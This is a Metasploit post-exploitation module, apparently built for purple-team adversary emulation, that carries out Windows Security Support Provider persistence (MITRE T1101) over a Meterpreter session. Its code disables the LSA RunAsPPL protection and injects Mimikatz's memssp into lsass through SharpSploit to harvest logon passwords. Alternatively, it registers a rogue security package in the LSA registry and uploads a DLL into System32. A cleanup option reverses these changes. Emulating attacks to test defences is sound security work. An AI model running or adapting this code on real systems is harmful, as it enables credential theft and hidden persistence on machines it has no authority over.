##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv
  include Msf::Exploit::FileDropper

  WCHAR = Encoding::UTF_16LE
  WCHAR_NUL = "\0".encode(WCHAR).freeze
  WCHAR_SIZE = WCHAR_NUL.bytesize

  LSA_REG_LOCATION = 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA'
  SECURITY_PACKAGES = 'Security Packages'
  RUNAS_PPL = 'RunAsPPL'

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Security Support Provider (T1101) Windows - Purple Team",
      'Description'          => %q{
        Persistence:
        Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.},
      'License'              => MSF_LICENSE,
      'References'           => [
          [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1101' ]
      ],
      'Platform'             => [ 'win' ],
      'SessionTypes'         => [ 'meterpreter' ],
      'Author'               => [ 'Praetorian' ]
    ))
    register_options(
      [
        OptBool.new('CLEANUP', [ true, 'If CLEANUP is false, it will set the registry key and upload the DLL. If CLEANUP is true, it will unset the registry key and cleanup the EXE', false ]),
        OptBool.new('INJECTSSP', [ true, 'If true, inject the ssp directly into lsass memory. If false, modify keys, upload the kiwissp, and register as a security package.', true ]),
        OptBool.new('UNSET_RUNASPPL', [ true, 'Disable the protection provided in Windows 8.1 and Server 2012 R2 and later but unsetting the HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL',false ])
      ])
  end

  def multi_sz_to_string(multi_sz)
    tmp = multi_sz

    tmp = tmp.gsub("\x00\x00\x00\x00",'')
    tmp = tmp.gsub("\x00\x00",' ')
    tmp = tmp.gsub("\x00",'')
    return tmp
  end

  def multi_sz_append(multi_sz,new_str)
    if multi_sz == "\"\x00\"\x00\x00\x00\x00\x00"
      tmp = new_str.scan(/\w/).join("\x00")
      multi_sz = tmp + "\x00\x00\x00\x00\x00"
    else
      multi_sz.gsub!("\x00\x00\x00\x00",'')
      tmp = new_str.scan(/\w/).join("\x00")
      tmp = tmp + "\x00"
      multi_sz = multi_sz.to_s + "\x00\x00" + tmp.to_s + "\x00\x00\x00\x00"
    end

    return multi_sz
  end

  def string_to_multi_sz(str)
    data = str

    data = data.gsub(" ","\t\t")
    tmp = ""
    words = data.split("\t\t")
    words.each do |i|
      tmp << i.scan(/\w/).join("\x00")
      tmp << "\x00\x00\x00"
    end

    data = tmp + "\x00\x00"

    return data
  end

  def get_key(key,type)
    # Check if the key exists. Not present by default
    print_status("Checking if the #{LSA_REG_LOCATION}\\#{key} #{type} exists...")
    begin
      value = registry_getvaldata(LSA_REG_LOCATION, key)
      key_exists = !value.nil?
      return value
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
    end
  end

  def runas_ppl_enable()
    value = get_key(RUNAS_PPL,'REG_DWORD')
    key_exists = !value.nil?

    begin
      verb = key_exists ? 'Setting' : 'Creating'
      print_status("#{verb} #{RUNAS_PPL} DWORD value as 00000001...")

      if key_exists
        print_status("Previous value was #{value}")
      end
      new_value = '00000001'
      if registry_setvaldata(LSA_REG_LOCATION, RUNAS_PPL, new_value, 'REG_DWORD')
        print_good("LSA RunAsPPL enabled.")
      else
        print_error('Unable to access registry key - insufficient privileges?')
      end
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
    end
  end

  def runas_ppl_disable()
    value = get_key(RUNAS_PPL,'REG_DWORD')
    key_exists = !value.nil?

    begin
      verb = key_exists ? 'Setting' : 'Creating'
      print_status("#{verb} #{RUNAS_PPL} DWORD value as 00000000...")

      if key_exists
        verb = 'Setting'
        print_status("Previous value was #{value}")
      else
        verb = 'Creating'
      end
      new_value = '00000000'
      if registry_setvaldata(LSA_REG_LOCATION, RUNAS_PPL, new_value, 'REG_DWORD')
        print_good("LSA RunAsPPL disabled.")
      else
        print_error('Unable to access registry key - insufficient privileges?')
      end
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
    end
  end

  def mimilib_enable(new_ssp)
    value = get_key(SECURITY_PACKAGES,'REG_MULTI_SZ')
    key_exists = !value.nil?

    begin
      verb = key_exists ? 'Adding' : 'Creating'
      if value.nil?
        value = "\"\x00\"\x00\x00\x00\x00\x00"
      end

      old_value = string_to_multi_sz(value)
      old_value_str = multi_sz_to_string(value)

      if old_value_str == '""'
        new_ssp_multi_sz = string_to_multi_sz(new_ssp)
      else
        new_ssp_multi_sz = multi_sz_append(value,new_ssp)
      end

      tmp = new_ssp_multi_sz
      new_value_str = multi_sz_to_string(tmp)

      new_value_str.gsub!(/\s$/,'')
      print_status("#{verb} #{SECURITY_PACKAGES} MULTI_SZ old value:'#{old_value_str}' new value:'#{new_value_str}'...")

      if registry_setvaldata(LSA_REG_LOCATION, SECURITY_PACKAGES, new_ssp_multi_sz, 'REG_MULTI_SZ')
        print_good('LSA Security Packages enabled')
      else
        print_error('Unable to access registry key - insufficient privileges?')
      end
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
    end
  end

  def mimilib_disable(new_ssp)
    value = get_key(SECURITY_PACKAGES,'REG_MULTI_SZ')
    key_exists = !value.nil?
    begin
      old_value_str = multi_sz_to_string(value)

      if old_value_str !~ /#{new_ssp}/
        print_status("Registry doesnt contain SSP #{new_ssp}")
        return
      end

      verb = key_exists ? 'Setting' : 'Creating'

      old_value_multi_sz = string_to_multi_sz(old_value_str)

      new_value_str = old_value_str.gsub(new_ssp,'')
      new_value_multi_sz = string_to_multi_sz(new_value_str)

      if old_value_str == new_ssp
        new_value_str = '""'
        new_value_multi_sz = "\"\x00\"\x00\x00\x00\x00\x00"
      end

      new_value_str.gsub!(/\s$/,'')
      print_status("Removing #{new_ssp} from #{SECURITY_PACKAGES} old value:'#{old_value_str}' new value:'#{new_value_str}'...")

      if registry_setvaldata(LSA_REG_LOCATION, SECURITY_PACKAGES, new_value_multi_sz, 'REG_MULTI_SZ')
        print_good('LSA Security Packages disabled')
      else
        print_error('Unable to access registry key - insufficient privileges?')
      end
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::Unknown, "Unable to access registry key: #{e}")
    end
  end


  def inject_ssp(dll_path)
    print_status("loading powershell...")
    client.run_cmd("load powershell")
    print_status("importing module...")
    client.run_cmd("powershell_import #{dll_path}")
    print_status("injecting into lsass...")
    client.run_cmd("powershell_execute [SharpSploit.Credentials.Mimikatz]::Command(\\\"privilege::debug\\ misc::memssp\\\")")
    print_good("Done. Log out, log back in, and check C:\\Windows\\System32\\mimilsa for success.")
  end


  # upload mimikatz and inject ssp into lsass
  def mimissp
    print_status("Checking for .NET...")
    out = cmd_exec("reg query \"HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\"")
    path = ""
    if out =~ /v3.5/
      print_good("Found 3.5!")
      inject_ssp("data/purple/t1101/SharpSploit_35.dll")
    elsif out =~ /v4.0/
      print_good("Found 4.0!")
      inject_ssp("data/purple/t1101/SharpSploit_40.dll")
    else
      print_error("No 3.5 or 4.0 .NET assembly, in memory injection won't work...")
    end
  end


  def run
    # Make sure we meet the requirements before running the script, note no need to return
    # unless error
    return 0 if session.type != "meterpreter"

    unless is_admin?
      fail_with(Failure::NoAccess, "The current session does not have administrative rights.")
    end

    target_path = 'C:\\Windows\\System32\\t1101.dll'
    method = datastore['METHOD']
    unset_runasppl = datastore['UNSET_RUNASPPL']
    new_ssp = 't1101'
    cleanup = datastore['CLEANUP']
    inject = datastore['INJECTSSP']

    if cleanup
      mimilib_disable(new_ssp)

      begin
        print_status("Deleting #{target_path}")
        session.fs.file.rm(target_path)
      rescue ::Exception => e
        print_error("Unable to remove file: #{e.message}")
        print_error("Reboot and delete #{target_path} manually")
        return
      end
    else
      if unset_runasppl
        runas_ppl_disable()
      end
      if inject
        mimissp()
      else
        mimilib_enable(new_ssp)
        payload_file_contents = File.read(::Msf::Config.data_directory + '/purple/t1101/t1101_' + (client.arch == ARCH_X86 ? "x86" : "x64") + ".dll")
        begin
          print_status("Payload #{payload_file_contents.length} bytes long being uploaded to #{target_path}")
          write_file(target_path, payload_file_contents)
        rescue ::Exception => e
          fail_with(Failure::Unknown, "Error uploading file.")
        end
        print_status("Authentication package uploaded. Reboot the system, log in, and check C:\\1101.txt")
      end
    end
  end
end
